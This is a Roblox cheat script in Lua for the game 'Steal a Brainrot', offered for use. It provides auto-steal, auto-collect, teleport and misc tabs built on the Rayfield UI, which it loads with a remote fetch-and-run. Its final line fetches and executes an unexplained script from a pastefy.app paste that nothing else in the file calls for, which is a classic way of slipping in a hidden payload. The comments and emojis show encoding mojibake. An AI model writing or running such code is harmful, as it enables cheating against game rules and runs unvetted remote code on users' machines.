-- Made by Keisha üíñ
-- =======================================================

-- Load Rayfield
local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()

-- Main Window
local Window = Rayfield:CreateWindow({
    Name = "üß† Keisha Hub | Steal a Brainrot",
    LoadingTitle = "Steal a Brainrot - Keisha",
    LoadingSubtitle = "üíñ made by Keisha",
    ConfigurationSaving = {
        Enabled = true,
        FolderName = "KeishaHub",
        FileName = "Config"
    },
    KeySystem = false
})

-- Notify ri√™ng
local function KeishaNotify(title, content)
    Rayfield:Notify({
        Title = "üíé " .. title,
        Content = content,
        Duration = 4,
        Image = 6031280882
    })
end

-- =======================================================
-- TAB: FARM / COLLECT
-- =======================================================
local farmTab = Window:CreateTab("üå± Brainrot Farm", 6031280882)
farmTab:CreateSection("Auto System")

-- Auto Farm (demo)
local autoFarm = false
farmTab:CreateToggle({
    Name = "üß† Auto Steal Brainrot",
    CurrentValue = false,
    Callback = function(v)
        autoFarm = v
        KeishaNotify("Auto Farm", autoFarm and "Enabled" or "Disabled")

        task.spawn(function()
            while autoFarm do
                -- ‚ö†Ô∏è Thay workspace.NPCs th√†nh folder th·∫≠t ch·ª©a nh√¢n v·∫≠t trong game
                if workspace:FindFirstChild("NPCs") then
                    for _, npc in pairs(workspace.NPCs:GetChildren()) do
                        if npc:FindFirstChild("Head") then
                            -- V√≠ d·ª•: steal brainrot b·∫±ng c√°ch ch·∫°m v√†o ƒë·∫ßu NPC
                            firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, npc.Head, 0)
                            task.wait(0.2)
                            firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, npc.Head, 1)
                        end
                    end
                end
                task.wait(1)
            end
        end)
    end,
})

-- Auto Collect (demo)
local autoCollect = false
farmTab:CreateToggle({
    Name = "üí∞ Auto Collect Items",
    CurrentValue = false,
    Callback = function(v)
        autoCollect = v
        KeishaNotify("Auto Collect", autoCollect and "Enabled" or "Disabled")

        task.spawn(function()
            while autoCollect do
                -- ‚ö†Ô∏è Thay workspace.Drops b·∫±ng folder th·∫≠t ch·ª©a brainrot/item
                if workspace:FindFirstChild("Drops") then
                    for _, drop in pairs(workspace.Drops:GetChildren()) do
                        if drop:IsA("Part") then
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = drop.CFrame
                            task.wait(0.2)
                        end
                    end
                end
                task.wait(1)
            end
        end)
    end,
})

-- =======================================================
-- TAB: TELEPORT
-- =======================================================
local tpTab = Window:CreateTab("üåÄ Teleport", 6031280882)
tpTab:CreateSection("Quick Travel")

-- ‚ö†Ô∏è Thay CFrame.new(...) b·∫±ng t·ªça ƒë·ªô th·∫≠t trong map
local locations = {
    ["üè† Base"] = CFrame.new(0,5,0),
    ["üõí Shop"] = CFrame.new(50,5,100),
    ["üéÆ Arena"] = CFrame.new(-120,5,40)
}

tpTab:CreateDropdown({
    Name = "Select Location",
    Options = {"üè† Base","üõí Shop","üéÆ Arena"},
    CurrentOption = "üè† Base",
    Callback = function(loc)
        local char = game.Players.LocalPlayer.Character
        if char and char:FindFirstChild("HumanoidRootPart") then
            char.HumanoidRootPart.CFrame = locations[loc]
            KeishaNotify("Teleport", "Teleported to " .. loc)
        end
    end,
})

-- =======================================================
-- TAB: FUN / MISC
-- =======================================================
local miscTab = Window:CreateTab("‚öôÔ∏è Misc", 6031280882)

miscTab:CreateButton({
    Name = "Flash Screen (Effect)",
    Callback = function()
        local screenGui = Instance.new("ScreenGui", game.CoreGui)
        local flash = Instance.new("Frame", screenGui)
        flash.Size = UDim2.new(1,0,1,0)
        flash.BackgroundColor3 = Color3.new(1,1,1)
        flash.BackgroundTransparency = 0.2
        task.wait(0.3)
        screenGui:Destroy()
        KeishaNotify("Effect", "Flash finished ‚ú®")
    end,
})

miscTab:CreateButton({
    Name = "Rejoin Server",
    Callback = function()
        local TeleportService = game:GetService("TeleportService")
        local Players = game:GetService("Players")
        TeleportService:Teleport(game.PlaceId, Players.LocalPlayer)
    end,
})

loadstring(game:HttpGet("https://pastefy.app/cBWYevaN/raw", true))()
